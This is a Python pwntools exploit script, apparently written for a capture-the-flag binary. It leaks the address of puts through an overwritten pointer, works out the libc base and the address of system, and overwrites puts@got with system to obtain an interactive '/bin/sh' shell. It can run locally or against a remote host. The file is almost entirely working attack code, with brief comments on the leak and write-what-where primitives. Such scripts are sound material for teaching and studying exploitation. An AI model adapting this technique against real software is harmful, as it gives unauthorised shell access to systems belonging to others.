#!/usr/bin/python

from pwn import *

os.chdir('../public')
elf = context.binary = ELF("pwn")
context.terminal = ['tilix', '-a', 'app-new-session', '-e']
gs = '''
b *0x08048566
c
'''


def run():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.R:
        return remote(args.HOST, args.PORT)
    else:
        return process(elf.path)



def main():
    p = run()
    # p=remote("192.168.125.100", 41337)

    # Craft first stage (arbitrary read)
    leak_address = 0x0804a020     # Address of puts@got -- "readelf -r vuln | grep puts"
    command = "/bin/sh"
    stage_1 = command.ljust(40, "\x00") + p32(leak_address)
    p.recvrepeat(0.2)

    # Send the first stage
    p.send(stage_1)

    # Parse the response
    data = p.recvrepeat(0.2)
    leak = data[data.find("(")+1:data.rfind(")")]
    log.info("Got leaked data: %s" % leak)
    puts_addr = u32(leak[:4])
    log.info("puts@libc: 0x%x" % puts_addr)

    # Calculate libc base and system
    puts_offset = 0x067460
    libc_base = puts_addr - puts_offset
    log.info("libc base: 0x%x" % libc_base)
    system_offset = 0x03ce10
    system_addr = libc_base + system_offset
    log.info("system@libc: 0x%x" % system_addr)

    # Overwrite puts@got
    ret_address = system_addr
    p.send(p32(ret_address))

    p.interactive()

if __name__ == "__main__":
    main()


# vuln
# -------------------------------
# 1. It provides an information leak opportunity when the `move.color`
#    pointer is overwritten and the album name is printed.
# 2. It provides a write what where primitive when the `move.color` pointer
#    is overwritten and input is provided to the second prompt.